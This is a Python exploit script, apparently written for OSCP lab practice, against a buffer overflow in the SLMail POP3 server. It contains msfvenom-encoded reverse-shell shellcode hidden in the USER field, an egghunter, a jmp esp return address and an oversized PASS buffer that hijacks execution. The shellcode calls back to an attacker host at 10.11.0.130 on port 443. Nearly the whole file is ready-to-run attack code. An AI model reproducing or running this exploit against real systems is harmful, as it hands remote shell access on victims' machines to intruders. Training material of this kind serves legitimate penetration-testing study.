#!/usr/bin/python
# This is like the previous version but with an egghunter. The real
# shellcode lies in the user field which is not susceptible to a
# buffer overflow. The overflow in the pass field transfers control to
# the egghunter which searches the memory for the shellcode and in
# turn invokes the shellcode.

import socket
ip = "10.11.15.25"

# addr of jmp esp instruction
# jmp esp = \xff\xfe
# !mona find -s "\xff\xfe" -m slmfc.dll
# warning: endianness problems ahead
ret_addr = "\x8f\x35\x4a\x5f"

egg="W00T"

# root@kali:~/oscp/overflowexercise/slmail# msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.130 LPORT=443 -f c -a x86 --platform windows -b "\x00\x0a\x0d" -e x86/shikata_ga_nai
# Found 1 compatible encoders
# Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
# x86/shikata_ga_nai succeeded with size 351 (iteration=0)
# x86/shikata_ga_nai chosen with final size 351
# Payload size: 351 bytes
# Final size of c file: 1500 bytes
shellcode=(egg+egg + "\xda\xcb\xb8\xe3\x7c\x27\x89\xd9\x74\x24\xf4\x5a\x31\xc9\xb1"
"\x52\x31\x42\x17\x03\x42\x17\x83\x09\x80\xc5\x7c\x31\x91\x88"
"\x7f\xc9\x62\xed\xf6\x2c\x53\x2d\x6c\x25\xc4\x9d\xe6\x6b\xe9"
"\x56\xaa\x9f\x7a\x1a\x63\x90\xcb\x91\x55\x9f\xcc\x8a\xa6\xbe"
"\x4e\xd1\xfa\x60\x6e\x1a\x0f\x61\xb7\x47\xe2\x33\x60\x03\x51"
"\xa3\x05\x59\x6a\x48\x55\x4f\xea\xad\x2e\x6e\xdb\x60\x24\x29"
"\xfb\x83\xe9\x41\xb2\x9b\xee\x6c\x0c\x10\xc4\x1b\x8f\xf0\x14"
"\xe3\x3c\x3d\x99\x16\x3c\x7a\x1e\xc9\x4b\x72\x5c\x74\x4c\x41"
"\x1e\xa2\xd9\x51\xb8\x21\x79\xbd\x38\xe5\x1c\x36\x36\x42\x6a"
"\x10\x5b\x55\xbf\x2b\x67\xde\x3e\xfb\xe1\xa4\x64\xdf\xaa\x7f"
"\x04\x46\x17\xd1\x39\x98\xf8\x8e\x9f\xd3\x15\xda\xad\xbe\x71"
"\x2f\x9c\x40\x82\x27\x97\x33\xb0\xe8\x03\xdb\xf8\x61\x8a\x1c"
"\xfe\x5b\x6a\xb2\x01\x64\x8b\x9b\xc5\x30\xdb\xb3\xec\x38\xb0"
"\x43\x10\xed\x17\x13\xbe\x5e\xd8\xc3\x7e\x0f\xb0\x09\x71\x70"
"\xa0\x32\x5b\x19\x4b\xc9\x0c\x2c\x87\xd1\x4e\x58\x95\xd1\x4f"
"\x22\x10\x37\x25\x44\x75\xe0\xd2\xfd\xdc\x7a\x42\x01\xcb\x07"
"\x44\x89\xf8\xf8\x0b\x7a\x74\xea\xfc\x8a\xc3\x50\xaa\x95\xf9"
"\xfc\x30\x07\x66\xfc\x3f\x34\x31\xab\x68\x8a\x48\x39\x85\xb5"
"\xe2\x5f\x54\x23\xcc\xdb\x83\x90\xd3\xe2\x46\xac\xf7\xf4\x9e"
"\x2d\xbc\xa0\x4e\x78\x6a\x1e\x29\xd2\xdc\xc8\xe3\x89\xb6\x9c"
"\x72\xe2\x08\xda\x7a\x2f\xff\x02\xca\x86\x46\x3d\xe3\x4e\x4f"
"\x46\x19\xef\xb0\x9d\x99\x1f\xfb\xbf\x88\xb7\xa2\x2a\x89\xd5"
"\x54\x81\xce\xe3\xd6\x23\xaf\x17\xc6\x46\xaa\x5c\x40\xbb\xc6"
"\xcd\x25\xbb\x75\xed\x6f")

# shellcode is written in user field which is not vulnerable to an
# overflow.
# The overflow triggers the egghunter which searches for the string
# W00TW00T. Fortunately, our shellcode begins with W00TW00T. After
# finding the shellcode, the egghunter transfers control to the shellcode.

# root@kali:~/oscp/overflowexercise/slmail# msf-egghunter -f c -e W00T -p windows -a x86
egghunter=("\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a"
"\x74\xef\xb8\x57\x30\x30\x54\x89\xd7\xaf\x75\xea\xaf\x75\xe7"
"\xff\xe7")

pad = "\x90"*32

buf="A"*2606+ ret_addr +pad+ egghunter
# (2700-4-2606-368-32)

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print("\nSending evil buffer...")
    s.connect((ip, 110))    # Connect to ip at POP3 port
    data = s.recv(1024)     # receive banner
    print(data)             # print banner
        
    s.send('USER '+ shellcode +'\r\n') # send username
    data = s.recv(1024)     # receive banner
    print(data)             # print banner
    
    s.send('PASS '+ buf +'\r\n') # send password and overflow!
    data = s.recv(1024)     # receive banner
    print(data)             # print banner

    s.send('QUIT\r\n')      # send quit message
    s.close()               # close socket
    print("\nDone!")
except:
    print("Could not connect to POP3!")
    raise
